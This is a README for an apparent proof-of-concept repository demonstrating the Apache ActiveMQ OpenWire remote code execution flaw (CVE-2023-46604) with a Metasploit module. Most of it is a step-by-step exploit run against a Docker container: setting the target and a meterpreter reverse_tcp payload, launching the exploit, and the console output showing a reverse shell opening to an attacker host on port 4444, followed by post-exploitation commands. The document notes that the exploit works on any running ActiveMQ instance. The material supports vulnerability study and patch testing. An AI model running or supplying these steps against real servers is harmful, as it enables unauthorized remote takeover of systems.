# Apache ActiveMQ RCE: CVE-2023-46604

## Description

This folder contains an example of exploit using a Metasploit module (not yet released but already merged on Metasploit)

## Vulnerability Overview

- **CVE ID**: CVE-2023-46604
- **Impact**: Remote Code Execution (RCE)
- **Affected Protocols**: Openwire
- **Disclosure Date**: 2023-10-27

## Getting Started

### Prerequisites

- Docker
- Metasploit

Install prerequisites. This guide suppose you have already Metasploit installed.

### Usage

1. Clone the repository:

```bash
git clone https://github.com/oscerd/nice-cve-poc.git
```

2. Navigate into the directory:

```bash
cd CVE-2023-46604
```

3. Execute the PoC:

```bash
/opt/metasploit-framework/bin/msfconsole
```

This will start your Metasploit Console

Now you should run your Docker container

```bash
docker run -it -p 61616:61616 -p 8161:8161 symptoma/activemq:5.18.2
```

On your msfconsole do the following

```bash
msf6 > use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
[*] No payload configured, defaulting to cmd/windows/http/x64/meterpreter/reverse_tcp
```

Recover the container IP:

```bash
docker inspect \
  -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container_id>
```

For example it will be 172.17.0.2

Get Back to your Metasploit Console

```bash
msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set RHOST 172.17.0.2
RHOST => 172.17.0.2
msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set SRVHOST eth0
SRVHOST => 192.168.1.27
msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set target 1
target => 1
msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
PAYLOAD => cmd/linux/http/x64/meterpreter/reverse_tcp
```

Now we could try to exploit:

```bash
msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > check
[*] 172.17.0.2:61616 - The target appears to be vulnerable. Apache ActiveMQ 5.18.2
```

The target is vulnerable

So we could try to exploit the vulnerability

```bash
msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > exploit

[*] Started reverse TCP handler on 192.168.1.27:4444 
[*] 172.17.0.2:61616 - Running automatic check ("set AutoCheck false" to disable)
[+] 172.17.0.2:61616 - The target appears to be vulnerable. Apache ActiveMQ 5.18.2
[*] 172.17.0.2:61616 - Using URL: http://192.168.1.27:8080/wcFPYaQMIi
[*] 172.17.0.2:61616 - Sent ClassPathXmlApplicationContext configuration file.
[*] 172.17.0.2:61616 - Sent ClassPathXmlApplicationContext configuration file.
[*] Sending stage (3045380 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.1.27:4444 -> 172.17.0.2:44080) at 2023-11-07 18:36:31 +0100

meterpreter > pwd
/opt/activemq
meterpreter > sysinfo
Computer     : 172.17.0.2
OS           :  (Linux 6.5.7-200.fc38.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > cd /opt/activemq
meterpreter > ls
Listing: /opt/activemq
======================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100644/rw-r--r--  40581     fil   2023-06-27 14:41:27 +0200  LICENSE
100644/rw-r--r--  3334      fil   2023-06-27 14:41:27 +0200  NOTICE
100644/rw-r--r--  2611      fil   2023-06-27 14:41:27 +0200  README.txt
100755/rwxr-xr-x  250       fil   2023-11-07 18:36:31 +0100  YhVWwTSvx
100755/rwxr-xr-x  10771243  fil   2023-06-27 14:41:27 +0200  activemq-all-5.18.2.jar
040755/rwxr-xr-x  154       dir   2023-09-19 14:16:11 +0200  bin
040755/rwxr-xr-x  484       dir   2023-11-07 18:34:25 +0100  conf
040755/rwxr-xr-x  78        dir   2023-11-07 18:34:26 +0100  data
040755/rwxr-xr-x  92        dir   2023-09-19 14:16:10 +0200  docs
040755/rwxr-xr-x  50        dir   2023-09-19 14:16:10 +0200  examples
040755/rwxr-xr-x  1202      dir   2023-09-19 14:16:56 +0200  lib
040755/rwxr-xr-x  216       dir   2023-11-07 18:34:27 +0100  tmp
040755/rwxr-xr-x  82        dir   2023-09-19 14:16:11 +0200  webapps
040755/rwxr-xr-x  8         dir   2023-09-19 14:16:11 +0200  webapps-demo
```

This could be tested on multiple ActiveMQ version, since symptoma/activemq docker image support different older versions.

The exploit could work on any running ActiveMQ instance. It will be released in the Metasploit modules soon.

## References

- [Official CVE Record](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46604)
- [Other Related Research](https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-exploitation-of-apache-activemq-cve-2023-46604/)

